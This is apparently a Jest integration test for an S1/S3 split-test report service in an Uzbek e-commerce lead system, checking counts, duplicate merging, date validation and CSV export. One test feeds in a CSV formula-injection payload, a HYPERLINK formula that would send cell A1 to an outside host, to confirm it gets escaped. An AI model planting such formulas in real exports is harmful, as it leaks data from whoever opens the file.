import { Client } from 'pg';
import { DataSource } from 'typeorm';
import {
  CheckoutDeliveryDestination,
  LeadOrderStatus,
  LeadRejectReason,
  LeadSource,
  LeadStatus,
  LeadVariant,
} from '@app/common';
import { Click, LEAD_ENTITIES, Lead, Stream } from './entities';
import { CreateLeadTables1794787200000 } from './migrations/1794787200000-create-lead-tables';
import { CreateOfferContent1794873600000 } from './migrations/1794873600000-create-offer-content';
import { AddLeadReview1794960000000 } from './migrations/1794960000000-add-lead-review';
import { AddLeadQueue1795046400000 } from './migrations/1795046400000-add-lead-queue';
import { AddApiLeads1795132800000 } from './migrations/1795132800000-add-api-leads';
import { AddLeadStats1795564800000 } from './migrations/1795564800000-add-lead-stats';
import { AddCapiFields1795651200000 } from './migrations/1795651200000-add-capi-fields';
import { AddFraudCenter1795824000000 } from './migrations/1795824000000-add-fraud-center';
import { SiteOrder1798070400000 } from './migrations/1798070400000-site-order';
import { OperatorStateSince1798416000000 } from './migrations/1798416000000-operator-state-since';
import { Telephony1798675200000 } from './migrations/1798675200000-telephony';
import { LeadUpsell1799366400000 } from './migrations/1799366400000-lead-upsell';
import { OperatorBonus1799452800000 } from './migrations/1799452800000-operator-bonus';
import { csvCell, VariantReportService } from './variant-report.service';

const testDatabaseUrl = process.env.TEST_DATABASE_URL;
/** lead.integration.spec.ts dagi bilan bir xil: lead sxemasini DROP/CREATE qiladigan spec’lar ketma-ket. */
const LEAD_SCHEMA_TEST_LOCK = 2_304_002;
let schemaLock: Client | undefined;
const describeWithPostgres = testDatabaseUrl ? describe : describe.skip;

/**
 * BE-39 — S1 va S3 sinovi hisoboti (PostgreSQL). Davr: 2027-01-10 … 2027-01-11 (Toshkent).
 * Boshqa lead testlari bilan ketma-ket (`--runInBand`).
 */
describeWithPostgres('BE-39 S1 va S3 sinovi hisoboti (PostgreSQL)', () => {
  let db: DataSource;
  let seq = 0;
  const IN = new Date('2027-01-10T08:00:00.000Z');
  const OUT = new Date('2027-01-12T08:00:00.000Z');
  const catalogFake = {
    list: jest.fn(async () => [
      { productId: '501', name: 'Simsiz quloqchinlar' },
      { productId: '502', name: 'Elektr choynak' },
    ]),
  };
  const report = () =>
    new VariantReportService(db, catalogFake as never).report({
      from: '2027-01-10',
      to: '2027-01-11',
    });

  const stream = (code: string, productId: string) =>
    db.getRepository(Stream).save({
      code,
      affiliateId: '42',
      productId,
      salePrice: '189000',
    });
  const clicks = async (
    streamId: string,
    variant: LeadVariant | null,
    n: number,
    at = IN,
  ) => {
    const saved = await db
      .getRepository(Click)
      .save(
        Array.from({ length: n }, () =>
          db.getRepository(Click).create({ streamId, variant }),
        ),
      );
    await db.query(
      `UPDATE lead.click SET created_at = $2 WHERE id = ANY($1::bigint[])`,
      [saved.map((c) => c.id), at],
    );
  };
  const lead = async (
    streamId: string,
    variant: LeadVariant | null,
    extra: Partial<Lead> = {},
    at = IN,
  ) => {
    const row = await db.getRepository(Lead).save(
      db.getRepository(Lead).create({
        source: LeadSource.LANDING,
        streamId,
        affiliateId: '42',
        productId: '501',
        name: 'Mijoz',
        phoneE164: `+99890${String(1000000 + ++seq)}`,
        regionSoato: '1726',
        districtSoato: '1726266',
        addressLine: 'Turkiston ko‘chasi, 27-uy',
        whereDeliver: CheckoutDeliveryDestination.CENTER,
        salePrice: '189000',
        variant,
        status: LeadStatus.NEW,
        ...extra,
      }),
    );
    await db.query(`UPDATE lead.lead SET created_at = $2 WHERE id = $1`, [
      row.id,
      at,
    ]);
    return row;
  };
  const delivered = {
    status: LeadStatus.CONFIRMED,
    confirmedAt: IN,
    orderStatus: LeadOrderStatus.DELIVERED,
    deliveredAt: OUT,
  } as Partial<Lead>;

  beforeAll(async () => {
    if (!new URL(testDatabaseUrl!).pathname.toLowerCase().includes('test'))
      throw new Error(
        'TEST_DATABASE_URL faqat nomida "test" bor alohida bazaga ishora qilishi kerak',
      );
    schemaLock = new Client({ connectionString: testDatabaseUrl });
    await schemaLock.connect();
    await schemaLock.query('SELECT pg_advisory_lock($1)', [
      LEAD_SCHEMA_TEST_LOCK,
    ]);
    db = new DataSource({
      type: 'postgres',
      url: testDatabaseUrl,
      schema: 'lead',
      entities: LEAD_ENTITIES,
      migrations: [
        CreateLeadTables1794787200000,
        CreateOfferContent1794873600000,
        AddLeadReview1794960000000,
        AddLeadQueue1795046400000,
        AddApiLeads1795132800000,
        AddLeadStats1795564800000,
        AddCapiFields1795651200000,
        AddFraudCenter1795824000000,
        SiteOrder1798070400000,
        OperatorStateSince1798416000000,
        Telephony1798675200000,
        LeadUpsell1799366400000,
        OperatorBonus1799452800000,
      ],
      synchronize: false,
      logging: false,
    });
    await db.initialize();
    await db.query('DROP SCHEMA IF EXISTS lead CASCADE');
    await db.query('CREATE SCHEMA lead');
    await db.runMigrations();
  });

  afterAll(async () => {
    if (db?.isInitialized) {
      await db.query('DROP SCHEMA IF EXISTS lead CASCADE');
      await db.destroy();
    }
    await schemaLock?.end(); // sessiya yopilsa qulf bo‘shaydi
  });

  beforeEach(async () => {
    await db.query(
      `TRUNCATE ${LEAD_ENTITIES.map((e) => `lead.${db.getMetadata(e).tableName}`).join(', ')} RESTART IDENTITY CASCADE`,
    );
  });

  it('TC1, TC2, TC3: variant va mahsulot kesimidagi sonlar; variantsiz lid yo‘q; dublikat birinchi arizaning variantida', async () => {
    const a = await stream('aaaaaa', '501');
    const b = await stream('bbbbbb', '502');
    await clicks(a.id, LeadVariant.S1, 10);
    await clicks(a.id, LeadVariant.S3, 8);
    await clicks(b.id, LeadVariant.S1, 1);
    await clicks(a.id, null, 5); // variantsiz — kirmaydi
    await clicks(a.id, LeadVariant.S1, 3, OUT); // davrdan tashqari

    // S1: tasdiqlangan va qabul qilingan, yaroqsiz, rad, tasdiqlangan va rad etilgan posilka
    await lead(a.id, LeadVariant.S1, delivered);
    await lead(a.id, LeadVariant.S1, {
      status: LeadStatus.INVALID,
      attempts: 1,
    });
    await lead(a.id, LeadVariant.S1, {
      status: LeadStatus.REJECTED,
      rejectReason: LeadRejectReason.TOO_EXPENSIVE,
      attempts: 1,
    });
    await lead(a.id, LeadVariant.S1, {
      status: LeadStatus.CONFIRMED,
      confirmedAt: IN,
      orderStatus: LeadOrderStatus.REFUSED,
      refusedAt: OUT,
    });
    // S3: 2 dona qabul qilingan, qabul qilingan va qaytarilgan, navbatda
    const s3 = await lead(a.id, LeadVariant.S3, { ...delivered, quantity: 2 });
    await lead(a.id, LeadVariant.S3, {
      ...delivered,
      orderStatus: LeadOrderStatus.RETURNED_GRADED,
    });
    await lead(a.id, LeadVariant.S3);
    // TC3: S3 lidining dublikati S1 sahifasidan → S3 da
    await lead(a.id, LeadVariant.S1, {
      status: LeadStatus.MERGED,
      mergedIntoId: s3.id,
      phoneE164: s3.phoneE164,
    });
    // TC2: variantsiz lid (sotuvchi API si) va uning S1 dublikati — kirmaydi; davrdan tashqari lid — kirmaydi
    const api = await lead(a.id, null, {
      source: LeadSource.API,
      ...delivered,
    });
    await lead(a.id, LeadVariant.S1, {
      status: LeadStatus.MERGED,
      mergedIntoId: api.id,
      phoneE164: api.phoneE164,
    });
    await lead(a.id, LeadVariant.S1, delivered, OUT);

    const r = await report();
    expect(r.rows.map((x) => [x.variant, x.productId])).toEqual([
      [LeadVariant.S1, null],
      [LeadVariant.S3, null],
      [LeadVariant.S1, '501'],
      [LeadVariant.S3, '501'],
      [LeadVariant.S1, '502'],
    ]);
    const [s1All, s3All, s1, s3row, s1b] = r.rows;
    expect(s1).toMatchObject({
      productName: 'Simsiz quloqchinlar',
      visits: 10,
      applications: 4,
      duplicates: 0,
      duplicateRate: 0,
      valid: 3,
      confirmed: 2,
      shipped: 2,
      accepted: 1,
      returned: 0,
      amount: 189000,
      amountPer1000Visits: 18900000,
      rejectReasons: { TOO_EXPENSIVE: 1 },
    });
    expect(s3row).toMatchObject({
      visits: 8,
      applications: 4,
      duplicates: 1,
      duplicateRate: 25,
      valid: 3,
      confirmed: 2,
      shipped: 2,
      accepted: 2,
      returned: 1,
      amount: 378000,
      amountPer1000Visits: 47250000,
      rejectReasons: {},
    });
    expect(s1b).toMatchObject({
      productName: 'Elektr choynak',
      visits: 1,
      applications: 0,
      amount: 0,
    });
    expect(s1All).toMatchObject({
      productName: 'Hammasi',
      visits: 11,
      applications: 4,
      amount: 189000,
      amountPer1000Visits: 17181818,
    });
    expect(s3All).toMatchObject({
      visits: 8,
      applications: 4,
      accepted: 2,
      amount: 378000,
    });
    expect(r.note).toMatch(/to‘xtatilmaydi/);
    expect(r).toMatchObject({
      targetAcceptedPerVariant: 400,
      targetReached: false,
    });
    expect([s1All.targetReached, s1.targetReached]).toEqual([false, null]);

    const csv = await new VariantReportService(db, catalogFake as never).csv({
      from: '2027-01-10',
      to: '2027-01-11',
    });
    expect(csv.fileName).toBe('s1-s3-sinov_2027-01-10_2027-01-11.csv');
    const lines = csv.content.split('\r\n').filter(Boolean);
    expect(lines[0].startsWith('﻿Variant;Mahsulot ID;')).toBe(true);
    expect(lines).toHaveLength(6);
    expect(lines[0].endsWith(';Maqsad 400 posilka')).toBe(true);
    expect(lines[1].endsWith(';yetmadi')).toBe(true); // S1 jami: 1 ta qabul
    expect(lines[3]).toBe(
      'S1;501;Simsiz quloqchinlar;10;4;0;0;3;2;2;1;0;189000;18900000;TOO_EXPENSIVE: 1;',
    );
  });

  it('ma’lumot yo‘q — ikkala variant jami qatorlari nol bilan; noto‘g‘ri davr — 400', async () => {
    const r = await report();
    expect(r.rows).toEqual([
      expect.objectContaining({
        variant: LeadVariant.S1,
        productId: null,
        visits: 0,
        amountPer1000Visits: null,
        duplicateRate: null,
      }),
      expect.objectContaining({
        variant: LeadVariant.S3,
        productId: null,
        visits: 0,
      }),
    ]);
    const svc = new VariantReportService(db, catalogFake as never);
    await expect(
      svc.report({ from: '2027-01-11', to: '2027-01-10' }),
    ).rejects.toMatchObject({ status: 400 });
    await expect(
      svc.report({ from: '2027-1-1', to: '2027-01-10' }),
    ).rejects.toMatchObject({ status: 400 });
  });
  it('dublikat zanjiri oxirgi asosiy lidgacha; CSV: formula katagi apostrof bilan, foiz vergul bilan; mavjud bo‘lmagan sana — 400', async () => {
    const a = await stream('cccccc', '501');
    const roots: Lead[] = [];
    for (let i = 0; i < 5; i++) roots.push(await lead(a.id, LeadVariant.S3));
    // Operator «Dublikat»: variantsiz A (S3 asosiy lidga), unga avval qo‘shilgan S1 ariza D → hammasi S3 da
    const mid = await lead(a.id, null, {
      status: LeadStatus.MERGED,
      mergedIntoId: roots[0].id,
    });
    await lead(a.id, LeadVariant.S1, {
      status: LeadStatus.MERGED,
      mergedIntoId: mid.id,
    });
    const r = await report();
    const s3 = r.rows.find(
      (x) => x.variant === LeadVariant.S3 && x.productId === '501',
    );
    expect(s3).toMatchObject({
      applications: 7,
      duplicates: 2,
      duplicateRate: 28.6,
    });
    expect(
      r.rows.find((x) => x.variant === LeadVariant.S1 && x.productId === '501'),
    ).toBeUndefined();

    catalogFake.list.mockResolvedValueOnce([
      { productId: '501', name: '=HYPERLINK("http://x?"&A1;"bos")' },
    ] as never);
    const csv = await new VariantReportService(db, catalogFake as never).csv({
      from: '2027-01-10',
      to: '2027-01-11',
    });
    const line = csv.content.split('\r\n').find((l) => l.startsWith('S3;501;'));
    expect(line).toBe(
      `S3;501;"'=HYPERLINK(""http://x?""&A1;""bos"")";0;7;2;28,6;5;0;0;0;0;0;;;`,
    );
    expect(csvCell('-1')).toBe("'-1");
    expect(csvCell('a\rb')).toBe('"a\rb"');
    await expect(
      new VariantReportService(db, catalogFake as never).report({
        from: '2027-02-01',
        to: '2027-02-31',
      }),
    ).rejects.toMatchObject({ status: 400 });
  });
});
